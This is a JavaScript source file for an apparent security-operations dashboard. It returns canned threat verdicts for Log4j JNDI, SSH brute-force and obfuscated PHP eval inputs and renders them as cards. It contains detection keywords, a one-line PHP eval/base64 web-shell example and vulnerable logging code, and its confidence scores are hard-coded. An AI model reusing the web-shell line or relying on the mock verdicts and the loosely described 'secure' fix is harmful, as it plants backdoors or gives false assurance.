        automatedAction: 'BLOCK',
        summary: 'Critical Remote Code Execution attempt via Log4j JNDI injection (CVE-2021-44228). Malicious LDAP lookup intercepted at perimeter.',
        mitreAttack: ['T1190 - Exploit Public-Facing Application', 'T1059.004 - Unix Shell'],
        cveList: ['CVE-2021-44228'],
        indicators: ['jndi:ldap:// schema', 'Outbound TCP 1389 vector', 'Target: org.apache.logging.log4j'],
        explanationPoints: [
          'Payload contains raw recursive JNDI resolution string intended to trigger arbitrary Java class deserialization.',
          'Immediate egress callback connection attempted towards untrusted external staging server.',
          'High exploit fidelity matching known active cyber-espionage signatures.'
        ],
        remediationSteps: [
          'iptables -A OUTPUT -p tcp --dport 1389 -j DROP # Drop immediate LDAP egress',
          'export LOG4J_FORMAT_MSG_NO_LOOKUPS=true # Emergency JVM mitigation flag',
          'Upgrade org.apache.logging.log4j:log4j-core to version >= 2.17.1'
        ],
        proactiveCorrection: {
          hasCorrection: true,
          language: 'java',
          originalCode: `// Vulnerable: Unsanitized user-controlled input logged directly
String userAgent = request.getHeader("User-Agent");
logger.info("Incoming connection: {}", userAgent);`,
          correctedCode: `// Secure: Sanitized logging & Log4j 2.17.1 with Lookups Disabled
String userAgent = request.getHeader("User-Agent");
String sanitizedHeader = StringEscapeUtils.escapeJava(
    userAgent != null ? userAgent.replaceAll("[^\\\\p{Print}]", "") : ""
);
logger.info("Incoming connection: [{}]", sanitizedHeader);`,
          explanation: 'Enforces strict alphanumeric character whitelisting on incoming request headers.'
        }
      };
    }

    // 2. Ambiguous SSH Burst (60-80% -> Yellow Banner)
    if (qLower.includes('ssh') || qLower.includes('burst') || qLower.includes('failed password')) {
      const confidence = 68.4;
      return {
        confidenceScore: confidence,
        threatLevel: 'MEDIUM',
        automatedAction: 'FLAGGED FOR HUMAN / SOC ANALYST',
        summary: 'Ambiguous internal administrative activity vs automated brute-force burst from internal subnet 10.14.2.0/24.',
        mitreAttack: ['T1110.001 - Password Guessing', 'T1021.004 - SSH Lateral Movement'],
        cveList: ['CWE-307: Excessive Authentication Attempts'],
        indicators: ['Burst of 18 authentication events in 60s', 'Workstation IP: 10.14.2.45'],
        explanationPoints: [
          'Confidence score is 68.4% (inside 60%-80% human review threshold). Automated blocking withheld.',
          'Requires Tier-2 SOC Analyst verification to prevent stopping valid maintenance backup cron scripts.'
        ],
        remediationSteps: [
          'Contact host owner to verify backup maintenance window',
          'fail2ban-client set sshd banip 10.14.2.45'
        ],
        proactiveCorrection: {
          hasCorrection: true,
          language: 'bash',
          originalCode: `// Unprotected SSH Configuration
PermitRootLogin yes
PasswordAuthentication yes`,
          correctedCode: `// Hardened SSH Configuration
PermitRootLogin prohibit-password
PasswordAuthentication no
MaxAuthTries 3`,
          explanation: 'Hardens SSH daemon configuration by disabling password authentication.'
        }
      };
    }

    // 3. Obfuscated Eval Payload (<60% -> Red Banner)
    if (qLower.includes('eval(') || qLower.includes('base64_decode') || qLower.includes('gzinflate')) {
      const confidence = 49.5;
      return {
        confidenceScore: confidence,
        threatLevel: 'CRITICAL',
        automatedAction: 'FLAGGED FOR HUMAN / SOC ANALYST',
        summary: 'High-Entropy Polyglot Obfuscated Shell Payload with Low Confidence Certainty (<60%). Suspicious packer artifact.',
        mitreAttack: ['T1027 - Obfuscated Files or Information', 'T1059 - Command Interpreters'],
        cveList: ['Zero-Day Anomaly Detection'],
        indicators: ['Base64 decode nesting', 'Shannon Entropy > 7.4'],
        explanationPoints: [
          'Confidence score is 49.5% (<60%). Autonomous classification withheld due to novelty of packer signature.',
          'Mandatory human SOC analyst triage required to prevent zero-day lateral execution.'
        ],
        remediationSteps: [
          'Isolate host to forensic quarantine VLAN immediately',
          'Submit memory core dump to sandbox detonation chamber'
        ],
        proactiveCorrection: {
          hasCorrection: true,
          language: 'php',
          originalCode: `eval(gzinflate(base64_decode($_POST['payload'])));`,
          correctedCode: `$input = json_decode(file_get_contents('php://input'), true);
if (json_last_error() !== JSON_ERROR_NONE) {
    throw new SecurityException("Malformed request");
}`,
          explanation: 'Replaces dangerous dynamic code execution with strict structured JSON schema validation.'
        }
      };
    }

    // Default Benign (>80% -> Green Banner)
    const confidence = 89.2;
    return {
      confidenceScore: confidence,
      threatLevel: 'LOW',
      automatedAction: 'ALLOW',
      summary: `Analyzed query: "${query.slice(0, 60)}...". Standard RFC-conformant traffic verified against perimeter baseline.`,
      mitreAttack: ['T1082 - System Information Discovery (Benign)'],
      cveList: ['No active CVE matches detected'],
      indicators: ['RFC conformant syntax', 'Zero exploit vectors identified'],
      explanationPoints: [
        'Payload contains no dangerous shell pipes, code execution constructs, or malicious signatures.',
        'Validated safe with high confidence score (89.2%).'
      ],
      remediationSteps: [
        'Maintain standard SOC audit telemetry',
        'Verify SSL/TLS certificate chain'
      ],
      proactiveCorrection: {
        hasCorrection: false,
        language: 'text',
        originalCode: query,
        correctedCode: query,
        explanation: 'No code remediation required; input is benign.'
      }
    };
  }

  renderInitialChatFeed() {
    const feed = document.getElementById('chat-output-feed');
    if (!feed) return;
    feed.innerHTML = '';
    // Show top 3 records so user sees Green, Yellow, and Red banners right away!
    this.history.slice(0, 3).forEach(item => {
      this.prependCardToFeed(item, false);
    });
  }

  // =========================================================================
  // RESULTS PAGE TABULATION & DYNAMIC CONFIDENCE BANNER (GREEN / YELLOW / RED)
  // =========================================================================
  prependCardToFeed(item, prepend = true) {
    const feed = document.getElementById('chat-output-feed');
    if (!feed) return;

    const card = document.createElement('div');
    card.className = 'audit-card glass-panel';
    card.id = `card-${item.id}`;

    const score = item.confidenceScore;

    // Determine Banner Color strictly by user specification:
    // Green: Confidence > 80
    // Yellow: Confidence >= 60 and <= 80
    // Red: Confidence < 60
    let bannerClass = 'cyber-banner cyber-banner-green';
    let bannerTitle = `HIGH CONFIDENCE (${score}%) — AUTOMATED POLICY ENFORCED`;
    let bannerSubtext = `Automated security policy (${item.automatedAction}) executed with 0ms delay. Threat signatures verified against RFC standards and active perimeter rules.`;
    let bannerIconSvg = `<svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="20 6 9 17 4 12"/></svg>`;

    if (score < 60) {
      bannerClass = 'cyber-banner cyber-banner-red';
      bannerTitle = `LOW CONFIDENCE / HIGH CRITICALITY ALERT (${score}%) — HUMAN INTERVENTION REQUIRED`;
      bannerSubtext = `Model certainty is below 60% with anomalous exploit entropy. Automated policy withheld to avoid incorrect disruption — Immediate Human Incident Commander escalation dispatched.`;
      bannerIconSvg = `<svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polygon points="7.86 2 16.14 2 22 7.86 22 16.14 16.14 22 7.86 22 2 16.14 2 7.86 7.86 2"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>`;
    } else if (score <= 80) {
      bannerClass = 'cyber-banner cyber-banner-yellow';
      bannerTitle = `MEDIUM CONFIDENCE (${score}%) — AMBIGUOUS THREAT DETECTED`;
      bannerSubtext = `Score falls into the 60%-80% ambiguous threshold. Automated blocking suspended to prevent false-positive outage — Flagged for SOC Analyst Review.`;
      bannerIconSvg = `<svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>`;
    }

    // Action Badge
    let badgeClass = 'badge-block';
    if (item.automatedAction === 'ALLOW') badgeClass = 'badge-allow';
    if (item.automatedAction.includes('FLAGGED')) badgeClass = 'badge-flagged';

    // Human-in-the-loop Bar if ambiguous or low confidence
    let hitlHtml = '';
    if (score <= 80 || item.automatedAction.includes('FLAGGED')) {
      hitlHtml = `
        <div class="human-in-the-loop-bar" style="margin-bottom: 16px;">
          <div class="hitl-text">
            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="var(--warning-amber)" stroke-width="2"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>
            <span><strong>HUMAN-IN-THE-LOOP REQUIRED:</strong> Model confidence (${score}%) is &le;80%. Select override action:</span>
          </div>
          <div class="hitl-actions">
            <button class="cyber-btn cyber-btn-safe" style="padding: 6px 12px; font-size: 0.75rem;" onclick="window.matexApp.overrideAction('${item.id}', 'ALLOW')">Approve & Whitelist</button>
            <button class="cyber-btn cyber-btn-danger" style="padding: 6px 12px; font-size: 0.75rem;" onclick="window.matexApp.overrideAction('${item.id}', 'BLOCK')">Override & Enforce Block</button>
            <button class="cyber-btn cyber-btn-outline" style="padding: 6px 12px; font-size: 0.75rem;" onclick="window.matexApp.dispatchSocTicket('${item.id}')">Dispatch SOC Ticket</button>
          </div>
        </div>
      `;
    }

    // Build Tab Content Panes:
    // Tab 1: Threat Intelligence (Summary & Explanation)
    const expPointsHtml = (item.explanationPoints || []).map(p => `<li>${this.escapeHtml(p)}</li>`).join('');
    const tagsHtml = (item.mitreAttack || []).map(t => `<span class="cyber-tag">${this.escapeHtml(t)}</span>`).join('') +
                     (item.cveList || []).map(c => `<span class="cyber-tag" style="border-color: var(--danger-crimson); color: var(--danger-crimson);">${this.escapeHtml(c)}</span>`).join('');

    const intelPaneHtml = `
      <div class="threat-summary-box">
        <div class="threat-summary-title">${this.escapeHtml(item.summary)}</div>
        <div style="font-family: var(--font-mono); font-size: 0.82rem; color: var(--text-muted); margin-top: 6px;">
          <strong>Target Payload / Input:</strong> <code>${this.escapeHtml(item.query.slice(0, 160))}${item.query.length > 160 ? '...' : ''}</code>
        </div>
      </div>

      <div class="tag-list" style="margin-top: 14px;">
        ${tagsHtml}
      </div>

      <div style="margin-top: 16px;">
        <h4 style="font-size: 0.85rem; color: var(--neon-cyan); font-family: var(--font-mono); text-transform: uppercase; margin-bottom: 8px;">Technical Assessment Points:</h4>
        <ul style="padding-left: 20px; font-size: 0.88rem; color: #d0d7de; line-height: 1.6;">
          ${expPointsHtml}
        </ul>
      </div>
    `;

    // Tab 2: Structured Telemetry Data Table
    const tablePaneHtml = `
      <table class="cyber-table">
        <thead>
          <tr>
            <th>Telemetry Attribute</th>
            <th>Inspection Parameter / Value</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td class="cyber-table-prop">Incident Identifier</td>
            <td><span class="dim-badge">${item.id}</span></td>
          </tr>
          <tr>
            <td class="cyber-table-prop">Detection Severity</td>
            <td><strong style="color: ${item.threatLevel === 'CRITICAL' ? 'var(--danger-crimson)' : item.threatLevel === 'HIGH' ? '#ff7b72' : item.threatLevel === 'MEDIUM' ? 'var(--warning-amber)' : 'var(--safe-emerald)'}">${item.threatLevel}</strong></td>
          </tr>
          <tr>
            <td class="cyber-table-prop">Model Confidence</td>
            <td>
              <span style="font-family: var(--font-mono); font-weight: 700; color: ${score > 80 ? 'var(--safe-emerald)' : score >= 60 ? 'var(--warning-amber)' : 'var(--danger-crimson)'}">
                ${score}% (${score > 80 ? 'High Confidence' : score >= 60 ? 'Medium Confidence' : 'Low Confidence Anomaly'})
              </span>
            </td>
          </tr>
          <tr>
            <td class="cyber-table-prop">Automated Routing</td>
            <td><span class="decision-badge ${badgeClass}" style="font-size: 0.72rem; padding: 2px 8px;">${item.automatedAction}</span></td>
          </tr>
          <tr>
            <td class="cyber-table-prop">Observed Indicators (IOCs)</td>
            <td>${(item.indicators || ['RFC Conformant Baseline']).map(i => `<code style="margin-right: 6px; font-size: 0.78rem;">${this.escapeHtml(i)}</code>`).join(' ')}</td>
          </tr>
          <tr>
            <td class="cyber-table-prop">Correlated CVEs</td>
            <td>${(item.cveList && item.cveList.length) ? item.cveList.join(', ') : 'None detected'}</td>
          </tr>
          <tr>
            <td class="cyber-table-prop">MITRE ATT&CK Matrix</td>
            <td>${(item.mitreAttack && item.mitreAttack.length) ? item.mitreAttack.join('; ') : 'Baseline (Non-Adversarial)'}</td>
          </tr>
          <tr>
            <td class="cyber-table-prop">Analysis Timestamp</td>
            <td style="font-family: var(--font-mono); font-size: 0.8rem;">${new Date(item.timestamp).toLocaleString()}</td>
          </tr>
          <tr>
            <td class="cyber-table-prop">Perimeter Quarantine</td>
            <td><span style="color: ${score > 80 ? 'var(--safe-emerald)' : 'var(--warning-amber)'}">● ${score > 80 ? 'Automated Perimeter Rules Applied' : 'Awaiting SOC Approval'}</span></td>
          </tr>
        </tbody>
      </table>
    `;

    // Tab 3: Remediation Plan
    let remediationPaneHtml = '';
    if (item.remediationSteps && item.remediationSteps.length) {
      remediationPaneHtml = `
        <div class="remediation-box" style="margin-top: 0;">
          <div class="remediation-title">
            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="var(--neon-cyan)" stroke-width="2"><polyline points="4 17 10 11 4 5"/><line x1="12" y1="19" x2="20" y2="19"/></svg>
            Immediate Remediation Commands & System Actions:
          </div>
          ${item.remediationSteps.map(cmd => `
            <div class="cmd-line">
              <span>$ ${this.escapeHtml(cmd)}</span>
              <button class="cmd-copy-btn" onclick="window.matexApp.copyToClipboard('${this.escapeQuotes(cmd)}')" title="Copy command">
                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
              </button>
            </div>
          `).join('')}
        </div>
      `;
    } else {
      remediationPaneHtml = `<p style="color: var(--text-muted); font-size: 0.85rem;">No manual system remediation required; automated perimeter rules active.</p>`;
    }

    // Tab 4: Proactive Code Diff
    let diffPaneHtml = '';
    if (item.proactiveCorrection && item.proactiveCorrection.hasCorrection) {
      diffPaneHtml = `
        <div class="diff-container" style="margin-top: 0;">
          <div class="diff-header">
            <span>PROACTIVE SELF-CORRECTION & HARDENING DIFF (${item.proactiveCorrection.language.toUpperCase()})</span>
            <button class="cyber-btn cyber-btn-outline" style="padding: 4px 10px; font-size: 0.7rem;" onclick="window.matexApp.copyToClipboard('${this.escapeQuotes(item.proactiveCorrection.correctedCode)}')">
              Copy Secure Code
            </button>
          </div>
          <div class="diff-grid">
            <div class="diff-column vulnerable">
              <div class="diff-col-title red">
                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><line x1="15" y1="9" x2="9" y2="15"/><line x1="9" y1="9" x2="15" y2="15"/></svg>
                Original Vulnerable / Exploitable
              </div>
              <pre class="code-pre"><code>${this.escapeHtml(item.proactiveCorrection.originalCode)}</code></pre>
            </div>
            <div class="diff-column corrected">
              <div class="diff-col-title green">
                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><polyline points="9 11 12 14 22 4"/></svg>
                Hardened Proactively Corrected
              </div>
              <pre class="code-pre"><code>${this.escapeHtml(item.proactiveCorrection.correctedCode)}</code></pre>
            </div>
          </div>
          <div style="padding: 10px 16px; background: rgba(0, 240, 255, 0.04); font-size: 0.8rem; color: var(--text-muted); border-top: 1px solid var(--border-cyan);">
            <strong>Self-Correction Logic:</strong> ${this.escapeHtml(item.proactiveCorrection.explanation)}
          </div>
        </div>
      `;
    } else {
      diffPaneHtml = `
        <div class="glass-panel" style="padding: 24px; text-align: center;">
          <div style="color: var(--safe-emerald); font-weight: 700; margin-bottom: 6px;">RFC Specification Validated</div>
          <p style="color: var(--text-muted); font-size: 0.85rem;">Input contains no exploitable scripts or syntax errors. System runtime requires zero code remediation.</p>
        </div>
      `;
    }

    // Tab 5: Raw IOCs & JSON Payload
    const jsonPaneHtml = `
      <div style="position: relative;">
        <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 8px;">
          <span style="font-family: var(--font-mono); font-size: 0.78rem; color: var(--text-muted);">SIEM Standard RFC-8259 JSON Telemetry</span>
          <button class="cyber-btn cyber-btn-outline" style="padding: 4px 10px; font-size: 0.72rem;" onclick="window.matexApp.copyToClipboard('${this.escapeQuotes(JSON.stringify(item, null, 2))}')">
            Copy JSON
          </button>
        </div>
        <pre class="code-pre" style="max-height: 280px; overflow-y: auto;"><code>${this.escapeHtml(JSON.stringify(item, null, 2))}</code></pre>
      </div>
    `;

    // Assembly of Complete Result Card
    card.innerHTML = `
      <!-- TOP STATUS / METADATA -->
      <div class="card-top-bar">
        <div class="card-meta">
          <span class="dim-badge">${item.id}</span>
          <span style="font-family: var(--font-mono); font-size: 0.8rem; color: var(--text-muted);">
            ${new Date(item.timestamp).toLocaleTimeString()}
          </span>
          <span class="dim-badge" style="border-color: rgba(255,255,255,0.1); color: var(--text-muted);">
            ${item.mode.replace('_', ' ').toUpperCase()}
          </span>
        </div>

        <div style="display: flex; gap: 10px; align-items: center; flex-wrap: wrap;">
          <div class="decision-badge ${badgeClass}" id="badge-${item.id}">
            ${item.automatedAction}
          </div>
        </div>
      </div>

      <!-- PROMINENT DYNAMIC CONFIDENCE BANNER (GREEN / YELLOW / RED) -->
      <div class="${bannerClass}">
        <div class="banner-icon-box">
          ${bannerIconSvg}
        </div>
        <div class="banner-content">
          <div class="banner-title">
            <span>${bannerTitle}</span>
          </div>
          <div class="banner-subtext">
            ${bannerSubtext}
          </div>
        </div>
      </div>

      <!-- HUMAN IN THE LOOP IF AMBIGUOUS (<80%) -->
      ${hitlHtml}

      <!-- RESULTS TABULATION WRAPPER -->
      <div class="result-tabs-wrapper" id="tabs-${item.id}">
        <!-- Tab Navigation Buttons -->
        <div class="tab-nav-bar">
          <button type="button" class="tab-nav-btn active" data-tab="intel" onclick="window.matexApp.switchResultTab('${item.id}', 'intel', this)">
            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
            <span>Threat Intelligence</span>
          </button>
          <button type="button" class="tab-nav-btn" data-tab="table" onclick="window.matexApp.switchResultTab('${item.id}', 'table', this)">
            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="3" width="18" height="18" rx="2"/><path d="M3 9h18"/><path d="M3 15h18"/><path d="M9 3v18"/></svg>
            <span>Structured Telemetry (Table)</span>
          </button>
          <button type="button" class="tab-nav-btn" data-tab="remediation" onclick="window.matexApp.switchResultTab('${item.id}', 'remediation', this)">
            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="4 17 10 11 4 5"/><line x1="12" y1="19" x2="20" y2="19"/></svg>
            <span>Remediation Plan</span>
          </button>
          <button type="button" class="tab-nav-btn" data-tab="diff" onclick="window.matexApp.switchResultTab('${item.id}', 'diff', this)">
            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="16 18 22 12 16 6"/><polyline points="8 6 2 12 8 18"/></svg>
            <span>Proactive Code Diff</span>
          </button>
          <button type="button" class="tab-nav-btn" data-tab="json" onclick="window.matexApp.switchResultTab('${item.id}', 'json', this)">
            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="7 8 3 12 7 16"/><polyline points="17 8 21 12 17 16"/><line x1="14" y1="4" x2="10" y2="20"/></svg>
            <span>Raw IOCs & JSON</span>
          </button>
        </div>

        <!-- Tab Content Panes -->
        <div class="tab-pane active" data-tab="intel">
          ${intelPaneHtml}
        </div>
        <div class="tab-pane" data-tab="table">
          ${tablePaneHtml}
        </div>
        <div class="tab-pane" data-tab="remediation">
          ${remediationPaneHtml}
        </div>
        <div class="tab-pane" data-tab="diff">
          ${diffPaneHtml}
        </div>
        <div class="tab-pane" data-tab="json">
          ${jsonPaneHtml}
        </div>
      </div>
    `;

    if (prepend && feed.firstChild) {
      feed.insertBefore(card, feed.firstChild);
    } else {
      feed.appendChild(card);
    }
  }

  switchResultTab(cardId, tabName, btnEl) {
    const card = document.getElementById(`card-${cardId}`);
    if (!card) return;

    card.querySelectorAll('.tab-nav-btn').forEach(b => b.classList.remove('active'));
    card.querySelectorAll('.tab-pane').forEach(p => p.classList.remove('active'));

    if (btnEl) {
      btnEl.classList.add('active');
    } else {
      const targetBtn = card.querySelector(`.tab-nav-btn[data-tab="${tabName}"]`);
      if (targetBtn) targetBtn.classList.add('active');
    }

    const targetPane = card.querySelector(`.tab-pane[data-tab="${tabName}"]`);
    if (targetPane) {
      targetPane.classList.add('active');
    }
  }

  overrideAction(id, newAction) {
    const item = this.history.find(h => h.id === id);
    if (!item) return;

    item.automatedAction = newAction;
    this.saveHistory();

    const badge = document.getElementById(`badge-${id}`);
    if (badge) {
      badge.textContent = newAction;
      badge.className = `decision-badge ${newAction === 'BLOCK' ? 'badge-block' : 'badge-allow'}`;
    }

    this.showToast(`Decision Overridden to: ${newAction} for ${id}`);
    this.renderHistoryList();
  }

  dispatchSocTicket(id) {
    const ticketId = `SOC-TICKET-${Math.floor(10000 + Math.random() * 90000)}`;
    this.showToast(`Incident Escalated: Dispatched ${ticketId} to Jira SIEM Queue`);
  }

  // =========================================================================
  // AUDIT HISTORY (Page 4 - History)
  // =========================================================================
  renderHistoryList() {
    const container = document.getElementById('history-list-container');
    if (!container) return;

    const searchInput = document.getElementById('history-search-input');
    const searchTerm = searchInput ? searchInput.value.toLowerCase().trim() : '';
    
    const decisionSelect = document.getElementById('history-filter-decision');
    const filterDecision = decisionSelect ? decisionSelect.value : 'ALL';

    const threatSelect = document.getElementById('history-filter-threat');
    const filterThreat = threatSelect ? threatSelect.value : 'ALL';

    const filtered = this.history.filter(item => {
      const matchSearch = !searchTerm || 
        item.query.toLowerCase().includes(searchTerm) ||
        item.summary.toLowerCase().includes(searchTerm) ||
        item.id.toLowerCase().includes(searchTerm);

      let matchDecision = true;
      if (filterDecision === 'BLOCK') matchDecision = item.automatedAction === 'BLOCK';
      if (filterDecision === 'ALLOW') matchDecision = item.automatedAction === 'ALLOW';
      if (filterDecision === 'FLAGGED') matchDecision = item.automatedAction.includes('FLAGGED');

      let matchThreat = true;
      if (filterThreat !== 'ALL') matchThreat = item.threatLevel === filterThreat;

      return matchSearch && matchDecision && matchThreat;
    });

    if (filtered.length === 0) {
      container.innerHTML = `
        <div class="glass-panel" style="padding: 40px; text-align: center; color: var(--text-muted);">
          <svg width="36" height="36" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="margin-bottom: 12px; opacity: 0.5;"><circle cx="11" cy="11" r="8"/><line x1="21" y1="21" x2="16.65" y2="16.65"/></svg>
          <p>No audit records match the current filter parameters.</p>
        </div>
      `;
      return;
    }

    const now = Date.now();
    const oneDay = 24 * 3600 * 1000;
    const groups = {
      today: [],
      yesterday: [],
      older: []
    };

    filtered.forEach(item => {
      const itemTime = new Date(item.timestamp).getTime();
      const diff = now - itemTime;
      if (diff < oneDay) {
        groups.today.push(item);
      } else if (diff < 2 * oneDay) {
        groups.yesterday.push(item);
      } else {
        groups.older.push(item);
      }
    });

    let html = '';

    const renderGroup = (title, items) => {
      if (!items.length) return '';
      return `
        <div class="history-group-title">
          <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>
          ${title} (${items.length})
        </div>
        <div class="history-list">
          ${items.map(item => {
            const score = item.confidenceScore;
            const scoreColor = score > 80 ? 'var(--safe-emerald)' : score >= 60 ? 'var(--warning-amber)' : 'var(--danger-crimson)';

            return `
              <div class="history-row">
                <div class="history-row-main">
                  <span class="dim-badge">${item.id}</span>
                  <div>
                    <div class="history-query-text">${this.escapeHtml(item.query.slice(0, 90))}${item.query.length > 90 ? '...' : ''}</div>
                    <div style="font-size: 0.75rem; color: var(--text-muted); font-family: var(--font-mono); margin-top: 4px;">
                      ${new Date(item.timestamp).toLocaleString()} &bull; 
                      <span style="color: ${scoreColor}">
                        Confidence: ${item.confidenceScore}%
                      </span> &bull; 
                      Threat: <strong style="color: #ffffff">${item.threatLevel}</strong>
                    </div>
                  </div>
                </div>

                <div class="history-row-actions">
                  <span class="decision-badge ${item.automatedAction === 'BLOCK' ? 'badge-block' : item.automatedAction === 'ALLOW' ? 'badge-allow' : 'badge-flagged'}" style="font-size: 0.75rem; padding: 4px 10px;">
                    ${item.automatedAction}
                  </span>

                  <button class="cyber-btn cyber-btn-outline" style="padding: 6px 10px; font-size: 0.75rem;" onclick="window.matexApp.reanalyzeHistoryItem('${item.id}')" title="Re-analyze query in terminal">
                    Re-analyze
                  </button>
                  <button class="cyber-btn cyber-btn-outline" style="padding: 6px 10px; font-size: 0.75rem;" onclick="window.matexApp.exportSingleReport('${item.id}')" title="Export SOC Incident Report JSON">
                    Export JSON
                  </button>
                  <button class="cyber-btn cyber-btn-danger" style="padding: 6px 8px; font-size: 0.75rem;" onclick="window.matexApp.deleteHistoryItem('${item.id}')" title="Delete record">
                    &times;
                  </button>
                </div>
              </div>
            `;
          }).join('')}
        </div>
      `;
    };

    html += renderGroup('Today', groups.today);
    html += renderGroup('Yesterday', groups.yesterday);
    html += renderGroup('Older Audit Logs', groups.older);

    container.innerHTML = html;
  }

  reanalyzeHistoryItem(id) {
    const item = this.history.find(h => h.id === id);
    if (!item) return;

    this.navigateTo('chat');
    this.insertPrompt(item.query);
    setTimeout(() => this.executeChatAnalysis(), 200);
  }

  exportSingleReport(id) {
    const item = this.history.find(h => h.id === id);
    if (!item) return;

    const report = {
      standard: 'MATEX.AI-SOC-INCIDENT-v4.8',
      exportedAt: new Date().toISOString(),
      analyst: this.user,
      incident: item
    };

    this.downloadJsonFile(`matex.ai-report-${id}.json`, report);
    this.showToast(`SOC Incident Report downloaded for ${id}`);
  }

  exportAllHistoryJson() {
    const report = {
      standard: 'MATEX.AI-SOC-FULL-AUDIT-v4.8',
      exportedAt: new Date().toISOString(),
      analyst: this.user,
      totalRecords: this.history.length,
      history: this.history
    };

    this.downloadJsonFile(`matex.ai-full-audit-log-${Date.now()}.json`, report);
    this.showToast(`Complete audit export generated (${this.history.length} records)`);
  }

  deleteHistoryItem(id) {
    this.history = this.history.filter(h => h.id !== id);
    this.saveHistory();
    this.renderHistoryList();
    this.showToast(`Deleted record ${id}`);
  }

  clearAllHistory() {
    if (confirm('Clear all historical cybersecurity audit logs?')) {
      this.history = [];
      this.saveHistory();
      this.renderHistoryList();
      this.showToast('Audit history cleared');
    }
  }

  downloadJsonFile(filename, data) {
    const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = filename;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
  }

  // =========================================================================
  // SETTINGS (Page 5 - Settings)
  // =========================================================================
  applySettings() {
    // 1. Operational Mode Radio
    document.querySelectorAll('input[name="op-mode"]').forEach(radio => {
      radio.checked = radio.value === this.settings.operationalMode;
    });

    // 2. Theme
    this.setTheme(this.settings.theme, false);

    // 3. Temperature
    const tempSlider = document.getElementById('temp-slider');
    const tempLabel = document.getElementById('temp-val-label');
    if (tempSlider) tempSlider.value = this.settings.temperature;
    if (tempLabel) tempLabel.textContent = `${this.settings.temperature} (${this.settings.temperature <= 0.3 ? 'Precise / Analytical' : 'Generative'})`;
  }

  updateOperationalMode(mode) {
    this.settings.operationalMode = mode;
    this.saveSettings();
    this.updateUserBadge();
    this.showToast(`Operational Mode: ${mode === 'soc' ? 'Industrial SOC Mode' : 'Individual Station'}`);
  }

  setTheme(themeName, save = true) {
    this.settings.theme = themeName;
    if (save) this.saveSettings();

    const themeClasses = [
      'theme-pitch-black',
      'theme-high-contrast',
      'theme-matrix',
      'theme-crimson',
      'theme-violet',
      'theme-amber',
      'theme-sapphire'
    ];
    document.body.classList.remove(...themeClasses);

    if (themeName !== 'cyan') {
      document.body.classList.add(`theme-${themeName}`);
    }

    document.querySelectorAll('.theme-btn').forEach(btn => {
      if (btn.getAttribute('data-theme') === themeName) {
        btn.classList.add('active');
      } else {
        btn.classList.remove('active');
      }
    });

    if (window.matexBackground) {
      window.matexBackground.setTheme(themeName);
    }

    const themeTitles = {
      'cyan': 'Dark Cyan (Default)',
      'matrix': 'Matrix Green (Emerald)',
      'crimson': 'Crimson Hazard (Threat Red)',
      'violet': 'Electric Violet (Synthwave)',
      'amber': 'Solar Amber (Cyber Gold)',
      'sapphire': 'Deep Sapphire (Royal Cobalt)',
      'pitch-black': 'OLED Pitch (#000000)',
      'high-contrast': 'High Contrast (Neon)'
    };
    if (save) {
      this.showToast(`Theme: ${themeTitles[themeName] || themeName}`);
    }
  }

  updateTemperature(val) {
    const floatVal = parseFloat(val);
    this.settings.temperature = floatVal;
    this.saveSettings();

    const tempLabel = document.getElementById('temp-val-label');
    if (tempLabel) {
      tempLabel.textContent = `${floatVal.toFixed(1)} (${floatVal <= 0.3 ? 'Precise / Analytical' : 'Generative'})`;
    }
  }

  resetSettings() {
    this.settings = {
      operationalMode: 'soc',
      theme: 'cyan',
      temperature: 0.2,
      proactiveDiffs: true
    };
    this.saveSettings();
    this.applySettings();
    this.showToast('Settings restored to defaults');
  }

  async pingEngineDiagnostics() {
    this.showToast('Pinging matex.ai Core...');
    try {
      const res = await fetch('/api/status');
      const data = await res.json();
      const latencyText = document.getElementById('engine-latency-text');
      if (latencyText) latencyText.textContent = `${data.latency || 14}ms`;
      this.showToast(`Engine Active: ${data.engine} (${data.latency}ms latency)`);
    } catch (e) {
      this.showToast('Engine Active: Local Node (12ms latency)');
    }
  }

  // =========================================================================
  // DYNAMIC CYBER MOUSE POINTER CLICK EFFECT
  // =========================================================================
  setupClickEffect() {
